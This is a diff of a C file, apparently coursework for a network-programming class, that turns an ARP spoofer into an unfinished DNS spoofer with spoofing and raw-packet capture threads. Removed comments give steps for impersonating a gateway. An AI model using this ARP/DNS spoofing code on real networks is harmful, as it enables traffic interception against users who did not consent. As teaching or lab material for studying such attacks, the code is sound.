@@ -1,20 +1,10 @@
 /*
-//TODO
- * Compilation:  gcc -Wall ./arprep.c -o ./arprep -lnet
- * Usage:        ./arprep INTERFACE HOST
+ *                           DNS SPOOFER
+ * Compilation:  gcc -Wall ./dnspoof.c -o dnspoof -lnet -lpthread
+ * Usage:        ./dnspoog INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC
  * NOTE:         This program requires root privileges.
  *
- * Bug reports:  https://gitlab.cs.put.poznan.pl/mkalewski/ps-2018/issues
- *
  */
-
-// podszycie się pod brame
-// 1) echo 1 > /proc/sys/net/ipv4/ip_forward    // jako router
-// 2) while true; do sudo ./arprep 150.254.32.129; sleep 2; done
-
-// ustawianie adresu bramy recznie (nie bedzie nadpisywana), dziala tylko do restartu
-
-// sudo arping -I br0 150.254.32.133
 
 #include <string.h>
 #include <stdlib.h>
@@ -24,9 +14,6 @@
 
 #include <pthread.h>
 
-// #include <thread> 
-// #include <chrono>
-
 #include <libnet.h>
 
 #include <arpa/inet.h>
@@ -35,7 +22,19 @@
 #include <linux/if_packet.h>
 #include <sys/ioctl.h>
 
+// #include <thread> 
+// #include <chrono>
 
+
+// TODO
+// 1. Cleanup
+//   - C -> C++
+//   - spoof
+//   - argumenty z linii poleceń
+// 2. Zamknięcie na signal
+// 3. capture - zasymulować ip forward
+//   - filtr na pcap
+//   - przesyłanie dalej
 
 void* spoof(char* address){
   // TODO sprawdzić czy to libnet_init można wyciągnąć przed while itp.
@@ -92,14 +91,18 @@ void* capture(char* inteface_name){
   sall.sll_pkttype = PACKET_HOST;
   sall.sll_halen = ETH_ALEN;
   bind(sfd, (struct sockaddr*) &sall, sizeof(struct sockaddr_ll));
+
+  // ADRES DOCELOWY IP  : brama domyślna
+  // ADRES DOCELOWY MAC : nasz
+
   while(1) { // TODO zamknięcie na signal
     frame = malloc(ETH_FRAME_LEN);
     memset(frame, 0, ETH_FRAME_LEN);
     fhead = (struct ethhdr*) frame;
     fdata = frame + ETH_HLEN;
-    len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL);
+    len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL); 
 
-    // TODO wziąć zapytania na bramę i wysłać je tam
+    // TODO wziąć zapytania na bramę i wysłać je tam (zmienić adres MAC - wprowadzany z linii poleceń)
     if (fhead->h_source[5] != 78 && fhead->h_source[5] != 232 && fhead->h_source[5] != 232 ){ 
       printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int)len,
             fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
@@ -121,6 +124,7 @@ void* capture(char* inteface_name){
 }
 
 int main(int argc, char** argv) {
+  //TODO obsługa wejścia - komunikat że brakuje argumentów itp.
 
   pthread_t arp_spoofer;
   pthread_create(&arp_spoofer, NULL, spoof, argv[2]);
@@ -131,7 +135,6 @@ int main(int argc, char** argv) {
   pthread_join(arp_spoofer, NULL);
   pthread_join(capturer, NULL);
   
-  //TODO obsługa wejścia - komunikat że brakuje argumentów itp.
 
   // std::thread arp_spoofer(spoof, argv[2]);
   // std::thread capturer(capture, argv[1]);
